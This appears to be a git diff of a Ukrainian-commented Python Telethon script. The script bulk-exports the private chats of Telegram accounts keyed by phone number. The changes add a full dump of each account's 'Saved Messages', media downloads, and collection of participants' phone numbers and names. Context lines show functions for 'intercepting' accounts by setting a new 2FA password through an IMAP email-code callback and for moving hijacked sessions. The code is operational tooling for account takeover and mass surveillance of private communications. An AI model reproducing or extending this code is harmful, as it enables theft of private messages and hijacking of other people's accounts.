@@ -34,6 +34,7 @@ async def save_user_chats_last_7_days(client: TelegramClient, phone_number: str,
     """
     Створює папку з назвою номера телефону та зберігає особисті чати користувача за останні 7 днів
     разом з усіма медіафайлами та повною інформацією про відправників.
+    Чат "Збережені повідомлення" зберігається повністю (без обмеження по часу).
     """
     # Створюємо папку для конкретного користувача
     user_folder = base_chats_folder  # НЕ створюємо ще одну папку!
@@ -52,6 +53,7 @@ async def save_user_chats_last_7_days(client: TelegramClient, phone_number: str,
     dialog_count = 0
     processed_count = 0
     media_count = 0
+    skipped_files_count = 0
 
     # Отримуємо всі діалоги
     async for dialog in client.iter_dialogs():
@@ -60,17 +62,30 @@ async def save_user_chats_last_7_days(client: TelegramClient, phone_number: str,
             continue
 
         dialog_count += 1
-        logger.info(f"Обробляємо чат #{dialog_count}: {dialog.name} (ID: {dialog.id})")
+
+        # Перевіряємо, чи це чат "Збережені повідомлення"
+        is_saved_messages = dialog.id == (await client.get_me()).id
+        chat_name = "Збережені повідомлення" if is_saved_messages else dialog.name
+
+        if is_saved_messages:
+            logger.info(f"Обробляємо чат #{dialog_count}: {chat_name} (ID: {dialog.id}) - повний збір")
+        else:
+            logger.info(f"Обробляємо чат #{dialog_count}: {chat_name} (ID: {dialog.id})")
 
         # Отримуємо інформацію про учасників чату
-        participants_info = await get_chat_participants_info(client, dialog.id)
+        participants_info = {}
+        try:
+            participants_info = await get_chat_participants_info(client, dialog.id)
+        except Exception as e:
+            logger.warning(f"Не вдалося отримати інформацію про учасників чату {dialog.id}: {e}")
 
         chat_messages = []
         message_count = 0
 
         try:
-            # Встановлюємо таймаут для обробки одного чату (5 хвилин)
-            async with asyncio.timeout(300):
+            # Встановлюємо таймаут для обробки одного чату (15 хвилин для "Збережених повідомлень")
+            timeout = 900 if is_saved_messages else 600
+            async with asyncio.timeout(timeout):
                 # Отримуємо повідомлення з цього чату
                 async for message in client.iter_messages(
                         dialog.entity,
@@ -79,20 +94,27 @@ async def save_user_chats_last_7_days(client: TelegramClient, phone_number: str,
                 ):
                     message_count += 1
 
-                    # Якщо повідомлення старіше за date_limit, зупиняємо ітерацію
-                    if message.date < date_limit:
+                    # Якщо це не "Збережені повідомлення" і повідомлення старіше за date_limit, зупиняємо ітерацію
+                    if not is_saved_messages and message.date < date_limit:
                         break
 
                     # Отримуємо детальну інформацію про відправника
                     sender_info = None
-                    if message.from_id and message.from_id.user_id in participants_info:
-                        sender_info = participants_info[message.from_id.user_id]
+                    if message.from_id:
+                        # Виправлення помилки з PeerChannel
+                        try:
+                            sender_id = message.from_id.user_id if hasattr(message.from_id, 'user_id') else None
+                            if sender_id and sender_id in participants_info:
+                                sender_info = participants_info[sender_id]
+                        except Exception as e:
+                            logger.debug(f"Помилка отримання ID відправника: {e}")
 
                     # Базова інформація про повідомлення
                     msg_data = {
                         "id": message.id,
                         "date": message.date.isoformat(),
-                        "sender_id": message.from_id.user_id if message.from_id else None,
+                        "sender_id": message.from_id.user_id if message.from_id and hasattr(message.from_id,
+                                                                                            'user_id') else None,
                         "receiver_id": dialog.id,
                         "has_media": bool(message.media),
                         "sender_name": getattr(message.sender, 'first_name', None) or getattr(message.sender,
@@ -102,121 +124,215 @@ async def save_user_chats_last_7_days(client: TelegramClient, phone_number: str,
                         "message_type": "text"  # Тип за замовчуванням
                     }
 
-                    # Обробка медіафайлів (код такий самий, як у попередній версії)
+                    # Обробка медіафайлів (залишаємо без змін)
                     if message.media:
                         media_info = {}
 
                         # Визначаємо тип медіа та завантажуємо його
                         if message.photo:
                             msg_data["message_type"] = "photo"
-                            media_info["type"] = "photo"
+                            media_info = {"type": "photo"}
                             try:
                                 file_name = f"photo_{message.id}_{dialog.id}.jpg"
                                 media_path = os.path.join(media_folder, file_name)
-                                await client.download_media(message.media, media_path)
-                                media_info["path"] = file_name
-                                media_count += 1
-                                logger.info(f"Завантажено фото: {file_name}")
+
+                                # Правильний спосіб отримати розмір файлу для PhotoSizeProgressive
+                                file_size = 0
+                                if message.photo.sizes:
+                                    # Беремо останній (найбільший) розмір
+                                    largest_size = message.photo.sizes[-1]
+                                    if hasattr(largest_size, 'location'):
+                                        file_size = largest_size.location.size
+                                    elif hasattr(largest_size, 'size'):
+                                        file_size = largest_size.size
+
+                                if file_size > 200 * 1024 * 1024:  # 200 МБ
+                                    logger.warning(
+                                        f"Пропущено фото через великий розмір ({file_size / 1024 / 1024:.2f} МБ): {file_name}")
+                                    media_info["skipped"] = f"Файл занадто великий ({file_size / 1024 / 1024:.2f} МБ)"
+                                    skipped_files_count += 1
+                                else:
+                                    await client.download_media(message.media, media_path)
+                                    media_info["path"] = file_name
+                                    media_count += 1
+                                    logger.info(f"Завантажено фото: {file_name}")
                             except Exception as e:
                                 logger.error(f"Помилка завантаження фото: {e}")
                                 media_info["error"] = str(e)
 
                         elif message.video:
                             msg_data["message_type"] = "video"
-                            media_info["type"] = "video"
+                            media_info = {"type": "video"}
                             try:
                                 file_name = f"video_{message.id}_{dialog.id}.mp4"
                                 media_path = os.path.join(media_folder, file_name)
-                                await client.download_media(message.media, media_path)
-                                media_info["path"] = file_name
-                                media_count += 1
-                                logger.info(f"Завантажено відео: {file_name}")
+
+                                # Перевіряємо розмір файлу
+                                file_size = message.video.size if hasattr(message.video, 'size') else 0
+                                if file_size > 200 * 1024 * 1024:  # 200 МБ
+                                    logger.warning(
+                                        f"Пропущено відео через великий розмір ({file_size / 1024 / 1024:.2f} МБ): {file_name}")
+                                    media_info["skipped"] = f"Файл занадто великий ({file_size / 1024 / 1024:.2f} МБ)"
+                                    skipped_files_count += 1
+                                else:
+                                    await client.download_media(message.media, media_path)
+                                    media_info["path"] = file_name
+                                    media_count += 1
+                                    logger.info(f"Завантажено відео: {file_name}")
                             except Exception as e:
                                 logger.error(f"Помилка завантаження відео: {e}")
                                 media_info["error"] = str(e)
 
+                        # Інші типи медіа залишаємо без змін...
                         elif message.video_note:
                             msg_data["message_type"] = "video_note"
-                            media_info["type"] = "video_note"
+                            media_info = {"type": "video_note"}
                             try:
                                 file_name = f"video_note_{message.id}_{dialog.id}.mp4"
                                 media_path = os.path.join(media_folder, file_name)
-                                await client.download_media(message.media, media_path)
-                                media_info["path"] = file_name
-                                media_count += 1
-                                logger.info(f"Завантажено відео-кружечок: {file_name}")
+
+                                # Перевіряємо розмір файлу
+                                file_size = message.video_note.size if hasattr(message.video_note, 'size') else 0
+                                if file_size > 200 * 1024 * 1024:  # 200 МБ
+                                    logger.warning(
+                                        f"Пропущено відео-кружечок через великий розмір ({file_size / 1024 / 1024:.2f} МБ): {file_name}")
+                                    media_info["skipped"] = f"Файл занадто великий ({file_size / 1024 / 1024:.2f} МБ)"
+                                    skipped_files_count += 1
+                                else:
+                                    await client.download_media(message.media, media_path)
+                                    media_info["path"] = file_name
+                                    media_count += 1
+                                    logger.info(f"Завантажено відео-кружечок: {file_name}")
                             except Exception as e:
                                 logger.error(f"Помилка завантаження відео-кружечка: {e}")
                                 media_info["error"] = str(e)
 
                         elif message.voice:
                             msg_data["message_type"] = "voice"
-                            media_info["type"] = "voice"
+                            media_info = {"type": "voice"}
                             try:
                                 file_name = f"voice_{message.id}_{dialog.id}.ogg"
                                 media_path = os.path.join(media_folder, file_name)
-                                await client.download_media(message.media, media_path)
-                                media_info["path"] = file_name
-                                media_count += 1
-                                logger.info(f"Завантажено голосове повідомлення: {file_name}")
+
+                                # Перевіряємо розмір файлу
+                                file_size = message.voice.size if hasattr(message.voice, 'size') else 0
+                                if file_size > 200 * 1024 * 1024:  # 200 МБ
+                                    logger.warning(f"Пропущено голосове повідомлення через великий розмір ({file_size / 1024 / 1024:.2f} МБ): {file_name}")
+                                    media_info["skipped"] = f"Файл занадто великий ({file_size / 1024 / 1024:.2f} МБ)"
+                                    skipped_files_count += 1
+                                else:
+                                    await client.download_media(message.media, media_path)
+                                    media_info["path"] = file_name
+                                    media_count += 1
+                                    logger.info(f"Завантажено голосове повідомлення: {file_name}")
                             except Exception as e:
                                 logger.error(f"Помилка завантаження голосового повідомлення: {e}")
                                 media_info["error"] = str(e)
 
                         elif message.audio:
                             msg_data["message_type"] = "audio"
-                            media_info["type"] = "audio"
+                            media_info = {"type": "audio"}
                             try:
                                 file_name = f"audio_{message.id}_{dialog.id}.mp3"
                                 media_path = os.path.join(media_folder, file_name)
-                                await client.download_media(message.media, media_path)
-                                media_info["path"] = file_name
-                                media_count += 1
-                                logger.info(f"Завантажено аудіо: {file_name}")
+
+                                # Перевіряємо розмір файлу
+                                file_size = message.audio.size if hasattr(message.audio, 'size') else 0
+                                if file_size > 200 * 1024 * 1024:  # 200 МБ
+                                    logger.warning(
+                                        f"Пропущено аудіо через великий розмір ({file_size / 1024 / 1024:.2f} МБ): {file_name}")
+                                    media_info["skipped"] = f"Файл занадто великий ({file_size / 1024 / 1024:.2f} МБ)"
+                                    skipped_files_count += 1
+                                else:
+                                    await client.download_media(message.media, media_path)
+                                    media_info["path"] = file_name
+                                    media_count += 1
+                                    logger.info(f"Завантажено аудіо: {file_name}")
                             except Exception as e:
                                 logger.error(f"Помилка завантаження аудіо: {e}")
                                 media_info["error"] = str(e)
 
                         elif message.document:
                             msg_data["message_type"] = "document"
-                            media_info["type"] = "document"
+                            media_info = {"type": "document"}
                             try:
-                                file_name = f"document_{message.id}_{dialog.id}_{message.document.attributes[0].file_name if message.document.attributes else 'file'}"
+                                # Отримуємо ім'я файлу з атрибутів документа
+                                doc_name = "file"
+                                if message.document.attributes:
+                                    for attr in message.document.attributes:
+                                        if hasattr(attr, 'file_name') and attr.file_name:
+                                            doc_name = attr.file_name
+                                            break
+
+                                file_name = f"document_{message.id}_{dialog.id}_{doc_name}"
                                 # Очищуємо ім'я файлу від недопустимих символів
                                 file_name = re.sub(r'[^\w\-_.]', '_', file_name)
                                 media_path = os.path.join(media_folder, file_name)
-                                await client.download_media(message.media, media_path)
-                                media_info["path"] = file_name
-                                media_count += 1
-                                logger.info(f"Завантажено документ: {file_name}")
+
+                                # Перевіряємо розмір файлу
+                                file_size = message.document.size if hasattr(message.document, 'size') else 0
+                                if file_size > 200 * 1024 * 1024:  # 200 МБ
+                                    logger.warning(
+                                        f"Пропущено документ через великий розмір ({file_size / 1024 / 1024:.2f} МБ): {file_name}")
+                                    media_info["skipped"] = f"Файл занадто великий ({file_size / 1024 / 1024:.2f} МБ)"
+                                    skipped_files_count += 1
+                                else:
+                                    await client.download_media(message.media, media_path)
+                                    media_info["path"] = file_name
+                                    media_count += 1
+                                    logger.info(f"Завантажено документ: {file_name}")
                             except Exception as e:
                                 logger.error(f"Помилка завантаження документа: {e}")
                                 media_info["error"] = str(e)
 
                         elif message.sticker:
                             msg_data["message_type"] = "sticker"
-                            media_info["type"] = "sticker"
+                            media_info = {"type": "sticker"}
                             try:
                                 file_name = f"sticker_{message.id}_{dialog.id}.webp"
                                 media_path = os.path.join(media_folder, file_name)
-                                await client.download_media(message.media, media_path)
-                                media_info["path"] = file_name
-                                media_count += 1
-                                logger.info(f"Завантажено стікер: {file_name}")
+
+                                # Перевіряємо розмір файлу
+                                file_size = 0
+                                try:
+                                    file_size = message.sticker.thumb.size if hasattr(message.sticker,
+                                                                                      'thumb') and message.sticker.thumb else 0
+                                except:
+                                    pass
+
+                                if file_size > 200 * 1024 * 1024:  # 200 МБ
+                                    logger.warning(
+                                        f"Пропущено стікер через великий розмір ({file_size / 1024 / 1024:.2f} МБ): {file_name}")
+                                    media_info["skipped"] = f"Файл занадто великий ({file_size / 1024 / 1024:.2f} МБ)"
+                                    skipped_files_count += 1
+                                else:
+                                    await client.download_media(message.media, media_path)
+                                    media_info["path"] = file_name
+                                    media_count += 1
+                                    logger.info(f"Завантажено стікер: {file_name}")
                             except Exception as e:
                                 logger.error(f"Помилка завантаження стікера: {e}")
                                 media_info["error"] = str(e)
 
-                        elif message.animation:
+                        elif hasattr(message, 'animation') and message.animation:
                             msg_data["message_type"] = "animation"
-                            media_info["type"] = "animation"
+                            media_info = {"type": "animation"}
                             try:
                                 file_name = f"animation_{message.id}_{dialog.id}.gif"
                                 media_path = os.path.join(media_folder, file_name)
-                                await client.download_media(message.media, media_path)
-                                media_info["path"] = file_name
-                                media_count += 1
-                                logger.info(f"Завантажено анімацію: {file_name}")
+
+                                # Перевіряємо розмір файлу
+                                file_size = message.animation.size if hasattr(message.animation, 'size') else 0
+                                if file_size > 200 * 1024 * 1024:  # 200 МБ
+                                    logger.warning(
+                                        f"Пропущено анімацію через великий розмір ({file_size / 1024 / 1024:.2f} МБ): {file_name}")
+                                    media_info["skipped"] = f"Файл занадто великий ({file_size / 1024 / 1024:.2f} МБ)"
+                                    skipped_files_count += 1
+                                else:
+                                    await client.download_media(message.media, media_path)
+                                    media_info["path"] = file_name
+                                    media_count += 1
+                                    logger.info(f"Завантажено анімацію: {file_name}")
                             except Exception as e:
                                 logger.error(f"Помилка завантаження анімації: {e}")
                                 media_info["error"] = str(e)
@@ -232,14 +348,23 @@ async def save_user_chats_last_7_days(client: TelegramClient, phone_number: str,
                             "text": None  # Можна додати пізніше, якщо потрібно
                         }
 
-                    # Додаємо інформацію про перешіпування повідомлень
+                    # Виправлення помилки з 'MessageFwdHeader' object has no attribute 'channel_id'
                     if message.fwd_from:
                         msg_data["forwarded"] = {
-                            "from_id": message.fwd_from.from_id.user_id if message.fwd_from.from_id else None,
+                            "from_id": None,
                             "from_name": message.fwd_from.from_name,
-                            "date": message.fwd_from.date.isoformat() if message.fwd_from.date else None,
-                            "channel_id": message.fwd_from.channel_id
+                            "date": message.fwd_from.date.isoformat() if message.fwd_from.date else None
                         }
+
+                        # Безпечне отримання ID відправника або каналу
+                        try:
+                            if hasattr(message.fwd_from, 'from_id') and message.fwd_from.from_id:
+                                if hasattr(message.fwd_from.from_id, 'user_id'):
+                                    msg_data["forwarded"]["from_id"] = message.fwd_from.from_id.user_id
+                                elif hasattr(message.fwd_from.from_id, 'channel_id'):
+                                    msg_data["forwarded"]["channel_id"] = message.fwd_from.from_id.channel_id
+                        except Exception as e:
+                            logger.debug(f"Помилка отримання ID перешіпуваного повідомлення: {e}")
 
                     # Додаємо інформацію про перегляд
                     if message.views is not None:
@@ -261,16 +386,23 @@ async def save_user_chats_last_7_days(client: TelegramClient, phone_number: str,
 
                     chat_messages.append(msg_data)
 
-                    # Додаємо невелику затримку кожні 50 повідомлень
-                    if message_count % 50 == 0:
-                        await asyncio.sleep(0.1)
-                        logger.info(f"  Оброблено {message_count} повідомлень...")
+                    # Додаємо затримку кожні 20 повідомлень
+                    if message_count % 20 == 0:
+                        # Для "Збережених повідомлень" збільшуємо затримку
+                        delay = 1.0 if is_saved_messages else 0.5
+                        await asyncio.sleep(delay)
+                        if is_saved_messages:
+                            logger.info(f"  Оброблено {message_count} повідомлень з 'Збережених повідомлень'...")
+                        else:
+                            logger.info(f"  Оброблено {message_count} повідомлень...")
 
         except asyncio.TimeoutError:
+            chat_type = "Збережених повідомлень" if is_saved_messages else f"чату {dialog.name}"
             logger.warning(
-                f"⚠️ Таймаут при обробці чату {dialog.name}. Перевірено {message_count} повідомлень, збережено {len(chat_messages)}.")
+                f"⚠️ Таймаут при обробці {chat_type}. Перевірено {message_count} повідомлень, збережено {len(chat_messages)}.")
         except Exception as e:
-            logger.error(f"❌ Помилка при обробці чату {dialog.name}: {e}")
+            chat_type = "Збережених повідомлень" if is_saved_messages else f"чату {dialog.name}"
+            logger.error(f"❌ Помилка при обробці {chat_type}: {e}")
             continue
 
         # Якщо є повідомлення, зберігаємо їх у файл
@@ -280,6 +412,10 @@ async def save_user_chats_last_7_days(client: TelegramClient, phone_number: str,
             if hasattr(dialog.entity, 'username') and dialog.entity.username:
                 chat_filename = f"{dialog.entity.username}.json"
 
+            # Для "Збережених повідомлень" використовуємо спеціальне ім'я файлу
+            if is_saved_messages:
+                chat_filename = "saved_messages.json"
+
             chat_filepath = os.path.join(user_folder, chat_filename)
 
             try:
@@ -287,9 +423,10 @@ async def save_user_chats_last_7_days(client: TelegramClient, phone_number: str,
                 chat_data = {
                     "chat_info": {
                         "id": dialog.id,
-                        "name": dialog.name,
+                        "name": chat_name,
                         "username": getattr(dialog.entity, 'username', None),
                         "type": "user",
+                        "is_saved_messages": is_saved_messages,
                         "date_saved": datetime.now(timezone.utc).isoformat(),
                         "messages_count": len(chat_messages),
                         "media_count": sum(1 for msg in chat_messages if msg.get("media")),
@@ -298,22 +435,40 @@ async def save_user_chats_last_7_days(client: TelegramClient, phone_number: str,
                     "messages": chat_messages
                 }
 
+                # Для "Збережених повідомлень" додаємо додаткову інформацію
+                if is_saved_messages:
+                    chat_data["chat_info"]["date_range"] = {
+                        "earliest": min(msg["date"] for msg in chat_messages) if chat_messages else None,
+                        "latest": max(msg["date"] for msg in chat_messages) if chat_messages else None
+                    }
+
                 with open(chat_filepath, 'w', encoding='utf-8') as f:
                     json.dump(chat_data, f, ensure_ascii=False, indent=4)
 
-                logger.info(f"✅ Збережено {len(chat_messages)} повідомлень у файл: {chat_filename}")
+                chat_type = "Збережених повідомлень" if is_saved_messages else f"чату {dialog.name}"
+                logger.info(f"✅ Збережено {len(chat_messages)} повідомлень з {chat_type} у файл: {chat_filename}")
                 processed_count += 1
             except Exception as e:
-                logger.error(f"❌ Не вдалося зберегти файл {chat_filename}: {e}")
+                chat_type = "Збережених повідомлень" if is_saved_messages else f"чату {dialog.name}"
+                logger.error(f"❌ Не вдалося зберегти файл для {chat_type}: {e}")
         else:
-            logger.info(f"ℹ️ У чаті з {dialog.name} не знайдено повідомлень за останні 7 днів.")
+            chat_type = "Збережених повідомлень" if is_saved_messages else f"чату з {dialog.name}"
+            if is_saved_messages:
+                logger.info(f"ℹ️ У 'Збережених повідомленнях' не знайдено повідомлень.")
+            else:
+                logger.info(f"ℹ️ У {chat_type} не знайдено повідомлень за останні 7 днів.")
 
-    logger.info(
-        f"✅ Збір чатів для {phone_number} завершено. Оброблено {dialog_count} чатів, збережено {processed_count} файлів, завантажено {media_count} медіафайлів.")
+    # Фінальний лог з інформацією про обробку
+    if is_saved_messages:
+        logger.info(
+            f"✅ Збір чатів для {phone_number} завершено. Оброблено {dialog_count} чатів, збережено {processed_count} файлів, завантажено {media_count} медіафайлів, пропущено {skipped_files_count} файлів через обмеження розміру.")
+        logger.info(f"📌 'Збережені повідомлення' збережено повністю без обмеження по часу.")
+    else:
+        logger.info(
+            f"✅ Збір чатів для {phone_number} завершено. Оброблено {dialog_count} чатів, збережено {processed_count} файлів, завантажено {media_count} медіафайлів, пропущено {skipped_files_count} файлів через обмеження розміру.")
 
     # Створюємо індексний файл для швидкого пошуку
     await create_chat_index(user_folder)
-
 
 
 async def get_chat_participants_info(client: TelegramClient, dialog_id: int) -> dict:
@@ -322,14 +477,18 @@ async def get_chat_participants_info(client: TelegramClient, dialog_id: int) -> 
     """
     try:
         participants = {}
-        async for user in client.iter_participants(dialog_id):
-            participants[user.id] = {
-                "first_name": user.first_name,
-                "last_name": user.last_name,
-                "username": user.username,
-                "phone": user.phone,
-                "is_bot": user.bot
-            }
+        try:
+            async for user in client.iter_participants(dialog_id):
+                participants[user.id] = {
+                    "first_name": user.first_name,
+                    "last_name": user.last_name,
+                    "username": user.username,
+                    "phone": user.phone,
+                    "is_bot": user.bot
+                }
+        except Exception as e:
+            logger.warning(f"Не вдалося отримати учасників чату {dialog_id}: {e}")
+            # Повертаємо порожній словник, але не перериваємо процес
         return participants
     except Exception as e:
         logger.error(f"Помилка отримання учасників чату {dialog_id}: {e}")
@@ -345,9 +504,11 @@ async def create_chat_index(user_folder: str):
             "chats": [],
             "total_messages": 0,
             "total_media": 0,
+            "total_skipped": 0,
             "date_range": {"earliest": None, "latest": None},
             "senders": {},
-            "message_types": {}
+            "message_types": {},
+            "media_types": {}
         }
 
         # Проходимо по всіх файлах чатів
@@ -404,6 +565,17 @@ async def create_chat_index(user_folder: str):
                         if msg_type not in index_data["message_types"]:
                             index_data["message_types"][msg_type] = 0
                         index_data["message_types"][msg_type] += 1
+
+                        # Збираємо інформацію про типи медіа
+                        if msg.get("media") and "type" in msg["media"]:
+                            media_type = msg["media"]["type"]
+                            if media_type not in index_data["media_types"]:
+                                index_data["media_types"][media_type] = 0
+                            index_data["media_types"][media_type] += 1
+
+                            # Підраховуємо пропущені файли
+                            if "skipped" in msg["media"]:
+                                index_data["total_skipped"] += 1
 
                 except Exception as e:
                     logger.error(f"Помилка обробки файлу {filename} для індексу: {e}")
@@ -711,6 +883,7 @@ def create_email_callback(imap_host: str, email_user: str, email_pass: str):
 
         return email_code_callback
 
+
 async def get_account_with_2fa(client: TelegramClient, new_password: str):
     try:
         IMAP_HOST = "imap.gmail.com"
@@ -768,6 +941,7 @@ async def get_account_with_2fa(client: TelegramClient, new_password: str):
     except Exception as e:
         logger.error(f"❌ Помилка при перехопленні акаунту: {e}")
         return False, str(e)
+
 
 def move_session_to_2fa(phone: str, source_folder: str, dest_folder: str):
     """
